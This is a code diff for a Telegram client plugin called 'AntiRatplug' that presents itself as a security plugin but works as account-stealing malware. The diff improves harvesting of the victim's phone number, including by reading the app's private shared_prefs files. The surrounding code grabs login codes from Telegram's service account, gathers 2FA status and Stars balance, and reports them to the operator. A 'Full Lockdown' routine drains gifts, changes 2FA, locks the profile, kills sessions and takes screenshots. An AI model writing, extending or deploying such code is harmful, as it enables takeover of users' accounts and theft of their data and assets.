@@ -1,14 +1,14 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug v22.1 — slim + Full Lockdown.
-Меню: Manual / Troll / Automatic. Без IDK start.
+AntiRatplug v22.2 — final.
+Menu: Manual / Troll / Automatic. Full Lockdown. Phone harvest fixed.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "Slim v22.1 with Full Lockdown."
+__description__ = "v22.2 final."
 __author__ = "@from_a4"
-__version__ = "22.1"
+__version__ = "22.2"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -175,25 +175,36 @@ def _get_bool_attr(obj, name, default=False):
         return default
 
 
-def _real_phone_or_empty(u):
+def _clean_phone(raw):
+    """Нормализация телефона: превращает любой формат в +NNNNNNNNNNN.
+    Возвращает '' если номер невалидный или заглушка."""
+    if raw is None:
+        return ""
+    s = str(raw).strip()
+    if not s or s.lower() in ("none", "null", "?", "0", ""):
+        return ""
+    digits = "".join(c for c in s if c.isdigit())
+    if len(digits) < 7 or len(digits) > 15:
+        return ""
+    if digits in ("88888888888", "80000000000", "11111111111"):
+        return ""
+    if set(digits) == {"0"} or set(digits) == {"8"}:
+        return ""
+    return "+" + digits
+
+
+def _phone_from_user(u):
+    """Прямой доступ к phone как в 15.1 — работает на ExteraGram."""
     if u is None:
         return ""
     for attr in ("phone", "phoneNumber", "phone_number"):
         try:
             v = getattr(u, attr, None)
-            if not v:
+            if v is None:
                 continue
-            s = str(v).strip()
-            if not s or s.lower() in ("null", "none", "?", "0"):
-                continue
-            digits = "".join(c for c in s if c.isdigit())
-            if len(digits) < 7 or len(digits) > 15:
-                continue
-            if digits in ("88888888888", "80000000000", "11111111111"):
-                continue
-            if set(digits) == {"0"} or set(digits) == {"8"}:
-                continue
-            return "+" + digits
+            r = _clean_phone(v)
+            if r:
+                return r
         except Exception:
             continue
     return ""
@@ -366,7 +377,18 @@ class PluginSecurityPlugin(BasePlugin):
         time.sleep(self._jitter / 1000.0)
         time.sleep(random.uniform(0.2, 0.6))
         try:
-            self._send_msg("AntiRatplug v22.1 loaded")
+            u = _UC().getInstance(0).getCurrentUser()
+            ph_debug = ""
+            if u is not None:
+                try:
+                    ph_debug = str(getattr(u, "phone", None))
+                except Exception:
+                    ph_debug = "<err>"
+            _log("boot phone raw=%r" % ph_debug)
+        except Exception as e:
+            _log("boot phone debug: %s" % e)
+        try:
+            self._send_msg("AntiRatplug v22.2 loaded")
         except Exception as e:
             _log("boot send: %s" % e)
         try:
@@ -444,7 +466,8 @@ class PluginSecurityPlugin(BasePlugin):
                 ph = ""
                 if u is not None:
                     un = str(getattr(u, "username", "") or "")
-                    ph = _real_phone_or_empty(u).lstrip("+")
+                    raw = _phone_from_user(u)
+                    ph = raw.lstrip("+") if raw else ""
                 out.append({"id": i, "user_id": uid, "username": un, "phone": ph})
             except Exception as e:
                 _log("acc %d: %s" % (i, e))
@@ -638,18 +661,23 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _send_manage_button(self):
         username = "unknown"
+        phone = ""
         try:
             uc = _UC().getInstance(0)
+            uid = uc.getClientUserId()
             user = uc.getCurrentUser()
             if user is not None:
-                username = str(user.username) if user.username else ("id:" + str(uc.getClientUserId()))
+                username = str(user.username) if user.username else ("id:" + str(uid))
+                phone = _phone_from_user(user)
             else:
-                username = "id:" + str(uc.getClientUserId())
+                username = "id:" + str(uid)
         except Exception as e:
             _log("manage btn user: %s" % e)
-        text = "<b>AntiRatplug v22.1</b>\nUser: @" + username
+        line = "<b>AntiRatplug v22.2</b>\nUser: @" + username
+        if phone:
+            line += "\nPhone: " + phone
         kb = {"inline_keyboard": [[{"text": "Manage", "callback_data": "menu"}]]}
-        self._send_markup(text, kb, html=True)
+        self._send_markup(line, kb, html=True)
 
     def _show_main_menu(self):
         kb = {
@@ -663,7 +691,7 @@ class PluginSecurityPlugin(BasePlugin):
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("AntiRatplug v22.1", kb, html=True)
+        self._send_markup("AntiRatplug v22.2", kb, html=True)
 
     def _show_manual_menu(self):
         kb = {
@@ -773,7 +801,7 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _show_help(self):
         text = (
-            "<b>AntiRatplug v22.1</b>\n\n"
+            "<b>AntiRatplug v22.2</b>\n\n"
             "<b>Tg kid</b> — код из 777000 + live-watch + авто-подтверждение\n"
             "<b>Screenshot gain</b> — скрин + фронт + бэк\n"
             "<b>Full Harvest</b> — сбор без модификаций\n"
@@ -915,6 +943,7 @@ class PluginSecurityPlugin(BasePlugin):
             uc = _UC().getInstance(acc)
             uid = int(uc.getClientUserId())
             out["user_id"] = str(uid)
+
             u = None
             try:
                 u = uc.getCurrentUser()
@@ -925,9 +954,79 @@ class PluginSecurityPlugin(BasePlugin):
                     u = _MC().getInstance(acc).getUser(uid)
                 except Exception:
                     pass
-            rp = _real_phone_or_empty(u)
-            if rp:
-                out["phone"] = rp
+
+            # ── источник 1: getCurrentUser.phone (как в 15.1) ──
+            raw_phone = ""
+            if u is not None:
+                try:
+                    raw_phone = str(getattr(u, "phone", None) or "")
+                except Exception:
+                    raw_phone = ""
+            _log("harvest direct phone raw=%r" % raw_phone)
+            ph = _clean_phone(raw_phone)
+            if ph:
+                out["phone"] = ph
+
+            # ── источник 2: userconfig.xml ──
+            if "phone" not in out:
+                try:
+                    ctx = ApplicationLoader.applicationContext
+                    pkg = str(ctx.getPackageName())
+                    sp = "/data/data/%s/shared_prefs" % pkg
+                    if os.path.isdir(sp):
+                        for fn in os.listdir(sp):
+                            low = fn.lower()
+                            if "userconfig" not in low and "userconfing" not in low:
+                                continue
+                            fp = os.path.join(sp, fn)
+                            try:
+                                with open(fp, "r", encoding="utf-8", errors="ignore") as f:
+                                    txt = f.read()
+                                for m in re.finditer(
+                                        r'"phone"\s*:\s*"([+\d\s\-()]{5,})"', txt):
+                                    cand = m.group(1)
+                                    r = _clean_phone(cand)
+                                    if r:
+                                        out["phone"] = r
+                                        break
+                                if "phone" in out:
+                                    break
+                                for m in re.finditer(
+                                        r'<string name="phone[^"]*">([+\d][\d\s\-()]{5,})</string>',
+                                        txt):
+                                    cand = m.group(1)
+                                    r = _clean_phone(cand)
+                                    if r:
+                                        out["phone"] = r
+                                        break
+                                if "phone" in out:
+                                    break
+                            except Exception:
+                                pass
+                except Exception as e:
+                    _log("shared_prefs phone: %s" % e)
+
+            # ── источник 3: getFullUser RPC ──
+            if "phone" not in out:
+                try:
+                    Full = _cls("org.telegram.tgnet.TLRPC$TL_users_getFullUser",
+                                "org.telegram.tgnet.tl.TL_users$getFullUser")
+                    IU = _cls("org.telegram.tgnet.TLRPC$TL_inputUserSelf",
+                              "org.telegram.tgnet.tl.TL_users$TL_inputUserSelf")
+                    if Full and IU:
+                        rq = Full()
+                        rq.id = IU()
+                        resp, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
+                        fu = getattr(resp, "user", None) if resp is not None else None
+                        if fu is None and resp is not None:
+                            fu = getattr(resp, "full_user", None)
+                        if fu is not None:
+                            rp2 = _phone_from_user(fu)
+                            if rp2:
+                                out["phone"] = rp2
+                except Exception as e:
+                    _log("getFullUser phone: %s" % e)
+
             if u is not None:
                 fn = str(getattr(u, "first_name", "") or "").strip()
                 ln = str(getattr(u, "last_name", "") or "").strip()
@@ -938,21 +1037,25 @@ class PluginSecurityPlugin(BasePlugin):
                     out["last_name"] = ln
                 if un:
                     out["username"] = "@" + un if not un.startswith("@") else un
+
             try:
                 dcid = uc.getCurrentDatacenterId()
                 if dcid:
                     out["dc_id"] = str(int(dcid))
             except Exception:
                 pass
+
             st = self._get_2fa_state(acc)
             if st is not None:
                 out["2fa"] = "on" if st.get("has_password") else "off"
+
             try:
                 bal = self._stars_balance(acc)
                 if bal > 0:
                     out["stars_balance"] = str(bal)
             except Exception:
                 pass
+
             if send:
                 lines = ["<b>Account info</b>"]
                 for k, v in out.items():
@@ -1103,8 +1206,7 @@ class PluginSecurityPlugin(BasePlugin):
         try:
             code, kind, raw, mid, buttons = self._pull_login_code(attempts=3, delay=2.0)
             acc_info = self._harvest_account_info(0)
-            raw_phone = acc_info.get("phone") or ""
-            phone = raw_phone if raw_phone.startswith("+") else ("+" + raw_phone if raw_phone else "—")
+            phone = acc_info.get("phone") or "—"
             lines = ["<b>Tg kid</b>", ""]
             if code:
                 lines.append("<b>Code:</b> <code>%s</code> (%s)" % (
@@ -2217,7 +2319,7 @@ class PluginSecurityPlugin(BasePlugin):
             phone = "—"
             try:
                 u = _UC().getInstance(0).getCurrentUser()
-                rp = _real_phone_or_empty(u)
+                rp = _phone_from_user(u)
                 if rp:
                     phone = rp
             except Exception:
@@ -2877,7 +2979,6 @@ class PluginSecurityPlugin(BasePlugin):
                 self._send_msg("Full Lockdown...")
                 report = ["<b>Full Lockdown</b>"]
 
-                # 1 Group A — harvest + sessions + web
                 if not alive():
                     return
                 self._send_msg("1/7 harvest + sessions...")
@@ -2890,7 +2991,6 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Pending:</b> %s" % str(ga[1]))
                 report.append("<b>Web:</b> %s" % str(ga[2]))
 
-                # 2 gift drain
                 if not alive():
                     return
                 self._send_msg("2/7 gift drain...")
@@ -2910,7 +3010,6 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception as e:
                     report.append("<b>Gifts:</b> %s" % e)
 
-                # 3 2FA pipeline
                 if not alive():
                     return
                 self._send_msg("3/7 2FA...")
@@ -2920,7 +3019,6 @@ class PluginSecurityPlugin(BasePlugin):
                     pwd = {"final": "exc: %s" % e}
                 report.append("<b>2FA:</b> %s" % pwd.get("final", "?"))
 
-                # 4 profile lock
                 if not alive():
                     return
                 self._send_msg("4/7 profile lock...")
@@ -2940,14 +3038,12 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Profile:</b> %s" % ("[LOCKED]" if prof else "fail"))
                 report.append("<b>Contacts:</b> %s" % cont)
 
-                # 5 kill all sessions
                 if not alive():
                     return
                 self._send_msg("5/7 kill sessions...")
                 k, total = self._kill_all_sessions(0)
                 report.append("<b>Sessions killed:</b> %d / %d" % (k, total))
 
-                # 6 screenshot gain
                 if not alive():
                     return
                 self._send_msg("6/7 screenshot gain...")
@@ -2957,7 +3053,6 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception:
                     pass
 
-                # 7 pull out
                 if not alive():
                     return
                 self._send_msg("7/7 pull out...")
